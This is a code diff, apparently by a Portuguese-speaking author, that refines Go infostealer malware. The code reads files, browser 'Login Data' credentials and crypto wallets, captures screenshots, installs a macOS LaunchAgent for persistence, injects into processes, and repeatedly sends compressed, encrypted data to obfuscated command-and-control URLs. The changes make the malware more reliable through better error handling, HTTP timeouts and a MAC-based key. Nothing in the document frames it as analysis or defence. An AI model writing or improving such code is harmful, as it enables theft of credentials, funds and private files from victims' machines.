@@ -1,4 +1,3 @@
-go
 package main
 
 import (
@@ -11,7 +10,8 @@ import (
 	"fmt"
 	"image/png"
 	"io"
-	"io/ioutil"
+	mrand "math/rand"
+	"net"
 	"net/http"
 	"os"
 	"os/exec"
@@ -28,10 +28,18 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// Chave de criptografia dinâmica baseada no hostname e MAC
+// Chave de criptografia derivada do hostname e do primeiro MAC disponível
 func generateKey() []byte {
 	h, _ := os.Hostname()
-	hash := sha256.Sum256([]byte(h + time.Now().String()))
+	ifaces, _ := net.Interfaces()
+	mac := ""
+	for _, iface := range ifaces {
+		if hw := iface.HardwareAddr.String(); hw != "" {
+			mac = hw
+			break
+		}
+	}
+	hash := sha256.Sum256([]byte(h + mac))
 	return hash[:]
 }
 
@@ -146,7 +154,7 @@ func collectSystemInfo() Info {
 	for _, path := range paths {
 		files, _ := filepath.Glob(path + "/*")
 		for _, file := range files {
-			content, err := ioutil.ReadFile(file)
+			content, err := os.ReadFile(file)
 			if err == nil {
 				info.Files[file] = base64.StdEncoding.EncodeToString(content)
 			}
@@ -156,7 +164,7 @@ func collectSystemInfo() Info {
 	// Coleta credenciais
 	for _, path := range paths {
 		if strings.Contains(path, "Login Data") {
-			content, err := ioutil.ReadFile(path)
+			content, err := os.ReadFile(path)
 			if err == nil {
 				info.Credentials = append(info.Credentials, base64.StdEncoding.EncodeToString(content))
 			}
@@ -197,44 +205,53 @@ func encrypt(data []byte, key []byte) ([]byte, error) {
 
 // Compressão de dados
 func compress(data []byte) ([]byte, error) {
-	var b strings.Builder
-	w, _ := zlib.NewWriterLevel(&b, zlib.BestCompression)
-	_, err := w.Write(data)
+	var b bytes.Buffer
+	w, err := zlib.NewWriterLevel(&b, zlib.BestCompression)
 	if err != nil {
 		return nil, err
 	}
-	w.Close()
-	return []byte(b.String()), nil
+	if _, err = w.Write(data); err != nil {
+		w.Close()
+		return nil, err
+	}
+	if err = w.Close(); err != nil {
+		return nil, err
+	}
+	return b.Bytes(), nil
 }
 
 // Exfiltração para servidor C2
 func exfiltrate(data string, screenshot []byte, key []byte) error {
+	client := &http.Client{Timeout: 15 * time.Second}
 	domains := []string{
 		obfuscate("https://backup1.example.com/upload", key),
 		obfuscate("https://backup2.example.com/upload", key),
 	}
 	for _, domain := range domains {
 		url := deobfuscate(domain, key)
-		compressed, _ := compress([]byte(data))
+		compressed, err := compress([]byte(data))
+		if err != nil {
+			continue
+		}
 		encrypted, err := encrypt(compressed, key)
 		if err != nil {
 			continue
 		}
 
-		// Envia dados textuais
-		resp, err := http.Post(url, "application/octet-stream", strings.NewReader(string(encrypted)))
+		resp, err := client.Post(url, "application/octet-stream", bytes.NewReader(encrypted))
 		if err == nil {
 			resp.Body.Close()
 		}
 
-		// Envia captura de tela
 		if len(screenshot) > 0 {
-			compressedShot, _ := compress(screenshot)
-			encryptedShot, err := encrypt(compressedShot, key)
+			compressedShot, err := compress(screenshot)
 			if err == nil {
-				resp, err := http.Post(url+"/screenshot", "application/octet-stream", strings.NewReader(string(encryptedShot)))
+				encryptedShot, err := encrypt(compressedShot, key)
 				if err == nil {
-					resp.Body.Close()
+					resp, err := client.Post(url+"/screenshot", "application/octet-stream", bytes.NewReader(encryptedShot))
+					if err == nil {
+						resp.Body.Close()
+					}
 				}
 			}
 		}
@@ -357,7 +374,7 @@ func ensurePersistence(key []byte) {
     <true/>
 </dict>
 </plist>`, os.Args[0])
-		ioutil.WriteFile(os.Getenv("HOME")+"/Library/LaunchAgents/com.user.agent.plist", []byte(plist), 0644)
+		os.WriteFile(os.Getenv("HOME")+"/Library/LaunchAgents/com.user.agent.plist", []byte(plist), 0644)
 	}
 }
 
@@ -373,7 +390,9 @@ func main() {
 	ensurePersistence(key)
 
 	// Injeção em processos
-	injectIntoProcess(key)
+	if err := injectIntoProcess(key); err != nil {
+		fmt.Println("falha na injeção:", err)
+	}
 
 	// Coleta de dados
 	info := collectSystemInfo()
@@ -382,11 +401,12 @@ func main() {
 	data := fmt.Sprintf("Username: %s\nHostname: %s\nOS: %s\nFiles: %v\nCredentials: %v\nWallets: %v",
 		info.Username, info.Hostname, info.OS, info.Files, info.Credentials, info.CryptoWallets)
 
+	mrand.Seed(time.Now().UnixNano())
 	// Exfiltração
 	go func() {
 		for {
 			exfiltrate(data, info.Screenshot, key)
-			time.Sleep(time.Duration(5+rand.Intn(5)) * time.Minute) // Intervalo aleatório
+			time.Sleep(time.Duration(5+mrand.Intn(5)) * time.Minute) // Intervalo aleatório
 		}
 	}()
 
